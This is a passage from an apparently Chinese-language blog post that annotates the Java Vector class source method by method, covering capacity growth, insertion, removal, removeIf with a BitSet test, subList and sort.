<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//修改次数加1</span></span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="comment">//扩容</span></span><br><span class="line">        ensureCapacityHelper(elementCount + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//将元素追加到数组后</span></span><br><span class="line">        elementData[elementCount++] = e;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureCapacityHelper</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//如果指定容量超过元素数组的长度,则开始扩容 </span></span><br><span class="line">        <span class="keyword">if</span> (minCapacity - elementData.length &gt; <span class="number">0</span>)</span><br><span class="line">            grow(minCapacity);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">grow</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// overflow-conscious code</span></span><br><span class="line">        <span class="keyword">int</span> oldCapacity = elementData.length;</span><br><span class="line">        <span class="comment">//如果扩容基数大于0,每次扩容指定的基数,否则扩容两倍</span></span><br><span class="line">        <span class="keyword">int</span> newCapacity = oldCapacity + ((capacityIncrement &gt; <span class="number">0</span>) ?</span><br><span class="line">                                         capacityIncrement : oldCapacity);</span><br><span class="line">        <span class="keyword">if</span> (newCapacity - minCapacity &lt; <span class="number">0</span>)</span><br><span class="line">            newCapacity = minCapacity;</span><br><span class="line">        <span class="keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="number">0</span>)</span><br><span class="line">            newCapacity = hugeCapacity(minCapacity);</span><br><span class="line">        elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//取最大容量</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hugeCapacity</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (minCapacity &lt; <span class="number">0</span>) <span class="comment">// overflow</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> OutOfMemoryError();</span><br><span class="line">        <span class="keyword">return</span> (minCapacity &gt; MAX_ARRAY_SIZE) ?</span><br><span class="line">            Integer.MAX_VALUE :</span><br><span class="line">            MAX_ARRAY_SIZE;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="add-int-index-E-element"><a href="#add-int-index-E-element" class="headerlink" title="add(int index, E element)"></a>add(int index, E element)</h2></blockquote>
<p>指定索引位置插入元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">        insertElementAt(element, index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">insertElementAt</span><span class="params">(E obj, <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//修改次数加1</span></span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="comment">//边界检查</span></span><br><span class="line">        <span class="keyword">if</span> (index &gt; elementCount) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ArrayIndexOutOfBoundsException(index</span><br><span class="line">                                                     + <span class="string">" &gt; "</span> + elementCount);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//扩容</span></span><br><span class="line">        ensureCapacityHelper(elementCount + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//将index后的元素后移</span></span><br><span class="line">        System.arraycopy(elementData, index, elementData, index + <span class="number">1</span>, elementCount - index);</span><br><span class="line">        <span class="comment">//指定位置赋值</span></span><br><span class="line">        elementData[index] = obj;</span><br><span class="line">        <span class="comment">//元素个数加1</span></span><br><span class="line">        elementCount++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="addAll-Collection-lt-extends-E-gt-c"><a href="#addAll-Collection-lt-extends-E-gt-c" class="headerlink" title="addAll(Collection&lt;? extends E&gt; c)"></a>addAll(Collection&lt;? extends E&gt; c)</h2></blockquote>
<p>插入整个集合</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">addAll</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//修改次数加1</span></span><br><span class="line">        modCount++;</span><br><span class="line">        Object[] a = c.toArray();</span><br><span class="line">        <span class="keyword">int</span> numNew = a.length;</span><br><span class="line">        <span class="comment">//扩容</span></span><br><span class="line">        ensureCapacityHelper(elementCount + numNew);</span><br><span class="line">        <span class="comment">//将a元素全部复制到目标数组中</span></span><br><span class="line">        System.arraycopy(a, <span class="number">0</span>, elementData, elementCount, numNew);</span><br><span class="line">        <span class="comment">//元素个数增加指定集合的个数</span></span><br><span class="line">        elementCount += numNew;</span><br><span class="line">        <span class="comment">//添加的集合不为空返回true</span></span><br><span class="line">        <span class="keyword">return</span> numNew != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="addAll-int-index-Collection-lt-extends-E-gt-c"><a href="#addAll-int-index-Collection-lt-extends-E-gt-c" class="headerlink" title="addAll(int index, Collection&lt;? extends E&gt; c)"></a>addAll(int index, Collection&lt;? extends E&gt; c)</h2></blockquote>
<p>指定索引添加数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">addAll</span><span class="params">(<span class="keyword">int</span> index, Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//修改次数加1</span></span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="comment">//边界检查</span></span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt; elementCount)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ArrayIndexOutOfBoundsException(index);</span><br><span class="line"></span><br><span class="line">        Object[] a = c.toArray();</span><br><span class="line">        <span class="keyword">int</span> numNew = a.length;</span><br><span class="line">        <span class="comment">//扩容</span></span><br><span class="line">        ensureCapacityHelper(elementCount + numNew);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//需要移动元素的个数 </span></span><br><span class="line">        <span class="keyword">int</span> numMoved = elementCount - index;</span><br><span class="line">        <span class="comment">//要移动的元素的个数大于0,则将索引后的元素后移</span></span><br><span class="line">        <span class="keyword">if</span> (numMoved &gt; <span class="number">0</span>)</span><br><span class="line">            System.arraycopy(elementData, index, elementData, index + numNew,</span><br><span class="line">                             numMoved);</span><br><span class="line">        <span class="comment">//将集合参数复制到目标数组中</span></span><br><span class="line">        System.arraycopy(a, <span class="number">0</span>, elementData, index, numNew);</span><br><span class="line">        <span class="comment">//增加元素个数</span></span><br><span class="line">        elementCount += numNew;</span><br><span class="line">        <span class="comment">//添加的集合不为空返回true</span></span><br><span class="line">        <span class="keyword">return</span> numNew != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="copyInto-Object-anArray"><a href="#copyInto-Object-anArray" class="headerlink" title="copyInto(Object[] anArray)"></a>copyInto(Object[] anArray)</h2></blockquote>
<p>将所有元素复制到给定数组参数中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">copyInto</span><span class="params">(Object[] anArray)</span> </span>&#123;</span><br><span class="line">        System.arraycopy(elementData, <span class="number">0</span>, anArray, <span class="number">0</span>, elementCount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="set-int-index-E-element"><a href="#set-int-index-E-element" class="headerlink" title="set(int index, E element)"></a>set(int index, E element)</h2></blockquote>
<p>将指定索引位置的元素重新赋值,返回旧值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> E <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (index &gt;= elementCount)</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> ArrayIndexOutOfBoundsException(index);</span><br><span class="line"></span><br><span class="line">       E oldValue = elementData(index);</span><br><span class="line">       elementData[index] = element;</span><br><span class="line">       <span class="keyword">return</span> oldValue;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="get-int-index"><a href="#get-int-index" class="headerlink" title="get(int index)"></a>get(int index)</h2></blockquote>
<p>获取指定索引位置的元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (index &gt;= elementCount)</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> ArrayIndexOutOfBoundsException(index);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> elementData(index);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="indexOf-Object-o"><a href="#indexOf-Object-o" class="headerlink" title="indexOf(Object o)"></a>indexOf(Object o)</h2></blockquote>
<p>获取指定元素的索引</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> indexOf(o, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从指定索引位置开始查找指定元素的索引</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object o, <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = index ; i &lt; elementCount ; i++)</span><br><span class="line">                <span class="keyword">if</span> (elementData[i]==<span class="keyword">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = index ; i &lt; elementCount ; i++)</span><br><span class="line">                <span class="keyword">if</span> (o.equals(elementData[i]))</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="lastIndexOf-Object-o"><a href="#lastIndexOf-Object-o" class="headerlink" title="lastIndexOf(Object o)"></a>lastIndexOf(Object o)</h2></blockquote>
<p>指定元素最后出现的索引位置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">lastIndexOf</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> lastIndexOf(o, elementCount-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">lastIndexOf</span><span class="params">(Object o, <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= elementCount)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException(index + <span class="string">" &gt;= "</span>+ elementCount);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = index; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">                <span class="keyword">if</span> (elementData[i]==<span class="keyword">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = index; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">                <span class="keyword">if</span> (o.equals(elementData[i]))</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="remove-Object-o"><a href="#remove-Object-o" class="headerlink" title="remove(Object o)"></a>remove(Object o)</h2></blockquote>
<p>删除指定元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> removeElement(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">removeElement</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">int</span> i = indexOf(obj);</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            removeElementAt(i);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">removeElementAt</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= elementCount) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ArrayIndexOutOfBoundsException(index + <span class="string">" &gt;= "</span> +</span><br><span class="line">                                                     elementCount);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ArrayIndexOutOfBoundsException(index);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//移动的长度</span></span><br><span class="line">        <span class="keyword">int</span> j = elementCount - index - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//将索引后的元素前移</span></span><br><span class="line">        <span class="keyword">if</span> (j &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            System.arraycopy(elementData, index + <span class="number">1</span>, elementData, index, j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//元素个数减1</span></span><br><span class="line">        elementCount--;</span><br><span class="line">        <span class="comment">//最后一个元素设置为null</span></span><br><span class="line">        elementData[elementCount] = <span class="keyword">null</span>; <span class="comment">/* to let gc do its work */</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="remove-int-index"><a href="#remove-int-index" class="headerlink" title="remove(int index)"></a>remove(int index)</h2></blockquote>
<p>删除指定索引的元素,返回被移除的元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= elementCount)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ArrayIndexOutOfBoundsException(index);</span><br><span class="line">        E oldValue = elementData(index);</span><br><span class="line">        <span class="comment">//移动元素的个数  </span></span><br><span class="line">        <span class="keyword">int</span> numMoved = elementCount - index - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (numMoved &gt; <span class="number">0</span>)</span><br><span class="line">            System.arraycopy(elementData, index+<span class="number">1</span>, elementData, index,</span><br><span class="line">                             numMoved);</span><br><span class="line">        <span class="comment">//将最后的元素设置为null                     </span></span><br><span class="line">        elementData[--elementCount] = <span class="keyword">null</span>; <span class="comment">// Let gc do its work</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> oldValue;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="removeAll-Collection-lt-gt-c"><a href="#removeAll-Collection-lt-gt-c" class="headerlink" title="removeAll(Collection&lt;?&gt; c)"></a>removeAll(Collection&lt;?&gt; c)</h2></blockquote>
<p>将指定集合的元素删除</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">removeAll</span><span class="params">(Collection&lt;?&gt; c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.removeAll(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">removeAll</span><span class="params">(Collection&lt;?&gt; c)</span> </span>&#123;</span><br><span class="line">        Objects.requireNonNull(c);</span><br><span class="line">        <span class="keyword">boolean</span> modified = <span class="keyword">false</span>;</span><br><span class="line">        Iterator&lt;?&gt; it = iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c.contains(it.next())) &#123;</span><br><span class="line">                it.remove();</span><br><span class="line">                modified = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> modified;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="java-removeRange-int-fromIndex-int-toIndex"><a href="#java-removeRange-int-fromIndex-int-toIndex" class="headerlink" title="java removeRange(int fromIndex, int toIndex)"></a>java removeRange(int fromIndex, int toIndex)</h2></blockquote>
<p>将指定索引区间的元素删除</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">removeRange</span><span class="params">(<span class="keyword">int</span> fromIndex, <span class="keyword">int</span> toIndex)</span> </span>&#123;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="comment">//移动数组</span></span><br><span class="line">        <span class="keyword">int</span> numMoved = elementCount - toIndex;</span><br><span class="line">        System.arraycopy(elementData, toIndex, elementData, fromIndex,</span><br><span class="line">                         numMoved);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Let gc do its work</span></span><br><span class="line">        <span class="keyword">int</span> newElementCount = elementCount - (toIndex-fromIndex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将最后的元素设置为null       </span></span><br><span class="line">        <span class="keyword">while</span> (elementCount != newElementCount)</span><br><span class="line">            elementData[--elementCount] = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="subList-int-fromIndex-int-toIndex"><a href="#subList-int-fromIndex-int-toIndex" class="headerlink" title="subList(int fromIndex, int toIndex)"></a>subList(int fromIndex, int toIndex)</h2></blockquote>
<p>截取子序列</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取同步子List</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> List&lt;E&gt; <span class="title">subList</span><span class="params">(<span class="keyword">int</span> fromIndex, <span class="keyword">int</span> toIndex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Collections.synchronizedList(<span class="keyword">super</span>.subList(fromIndex, toIndex),</span><br><span class="line">                                            <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &lt;T&gt; <span class="function">List&lt;T&gt; <span class="title">synchronizedList</span><span class="params">(List&lt;T&gt; list, Object mutex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (list <span class="keyword">instanceof</span> RandomAccess ?</span><br><span class="line">                <span class="keyword">new</span> SynchronizedRandomAccessList&lt;&gt;(list, mutex) :</span><br><span class="line">                <span class="keyword">new</span> SynchronizedList&lt;&gt;(list, mutex));</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubList</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractList</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AbstractList&lt;E&gt; l;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> offset;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    SubList(AbstractList&lt;E&gt; list, <span class="keyword">int</span> fromIndex, <span class="keyword">int</span> toIndex) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fromIndex &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException(<span class="string">"fromIndex = "</span> + fromIndex);</span><br><span class="line">        <span class="keyword">if</span> (toIndex &gt; list.size())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException(<span class="string">"toIndex = "</span> + toIndex);</span><br><span class="line">        <span class="keyword">if</span> (fromIndex &gt; toIndex)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"fromIndex("</span> + fromIndex +</span><br><span class="line">                                               <span class="string">") &gt; toIndex("</span> + toIndex + <span class="string">")"</span>);</span><br><span class="line">        l = list;</span><br><span class="line">        offset = fromIndex;</span><br><span class="line">        size = toIndex - fromIndex;</span><br><span class="line">        <span class="keyword">this</span>.modCount = l.modCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="removeIf-Predicate-lt-super-E-gt-filter"><a href="#removeIf-Predicate-lt-super-E-gt-filter" class="headerlink" title="removeIf(Predicate&lt;? super E&gt; filter)"></a>removeIf(Predicate&lt;? super E&gt; filter)</h2></blockquote>
<p>根据函数式条件移除元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">removeIf</span><span class="params">(Predicate&lt;? <span class="keyword">super</span> E&gt; filter)</span> </span>&#123;</span><br><span class="line">        Objects.requireNonNull(filter);</span><br><span class="line">        <span class="comment">// figure out which elements are to be removed</span></span><br><span class="line">        <span class="comment">// any exception thrown from the filter predicate at this stage</span></span><br><span class="line">        <span class="comment">// will leave the collection unmodified</span></span><br><span class="line">        <span class="keyword">int</span> removeCount = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> size = elementCount;</span><br><span class="line">        <span class="comment">//创建位图</span></span><br><span class="line">        <span class="keyword">final</span> BitSet removeSet = <span class="keyword">new</span> BitSet(size);</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> expectedModCount = modCount;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; modCount == expectedModCount &amp;&amp; i &lt; size; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">            <span class="keyword">final</span> E element = (E) elementData[i];</span><br><span class="line">            <span class="keyword">if</span> (filter.test(element)) &#123;</span><br><span class="line">                removeSet.set(i);</span><br><span class="line">                removeCount++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//fail-fast 快速失败机制</span></span><br><span class="line">        <span class="keyword">if</span> (modCount != expectedModCount) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// shift surviving elements left over the spaces left by removed elements</span></span><br><span class="line">        <span class="comment">//是否有需要移除的元素</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">boolean</span> anyToRemove = removeCount &gt; <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (anyToRemove) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> newSize = size - removeCount;</span><br><span class="line">            <span class="comment">//重新赋值,跳过移除的元素</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>, j=<span class="number">0</span>; (i &lt; size) &amp;&amp; (j &lt; newSize); i++, j++) &#123;</span><br><span class="line">                i = removeSet.nextClearBit(i);</span><br><span class="line">                elementData[j] = elementData[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//将移除后的元素重置为null</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k=newSize; k &lt; size; k++) &#123;</span><br><span class="line">                elementData[k] = <span class="keyword">null</span>;  <span class="comment">// Let gc do its work</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//元素数量修改</span></span><br><span class="line">            elementCount = newSize;</span><br><span class="line">            <span class="comment">//fail-fast 快速失败机制</span></span><br><span class="line">            <span class="keyword">if</span> (modCount != expectedModCount) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//修改次数累加</span></span><br><span class="line">            modCount++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> anyToRemove;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>测试例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *删除大于1的元素</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Vector&lt;Integer&gt; vector = <span class="keyword">new</span> Vector&lt;&gt;();</span><br><span class="line">        vector.add(<span class="number">1</span>);</span><br><span class="line">        vector.add(<span class="number">2</span>);</span><br><span class="line">        vector.removeIf(a -&gt; a&gt;<span class="number">1</span>);</span><br><span class="line">        System.out.println(vector);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//位图测试</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testBitSet</span><span class="params">()</span></span>&#123;</span><br><span class="line">        BitSet bitSet = <span class="keyword">new</span> BitSet(<span class="number">4</span>);</span><br><span class="line">        bitSet.set(<span class="number">2</span>);</span><br><span class="line">        bitSet.set(<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> j = bitSet.nextClearBit(i);</span><br><span class="line">            System.out.println(j);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">输出结果:</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2></blockquote>
<p>sort 依然是归并排序和TimSort</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Comparator&lt;? <span class="keyword">super</span> E&gt; c)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">final</span> <span class="keyword">int</span> expectedModCount = modCount;</span><br><span class="line">       Arrays.sort((E[]) elementData, <span class="number">0</span>, elementCount, c);</span><br><span class="line">       <span class="keyword">if</span> (modCount != expectedModCount) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">       &#125;</span><br><span class="line">       modCount++;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
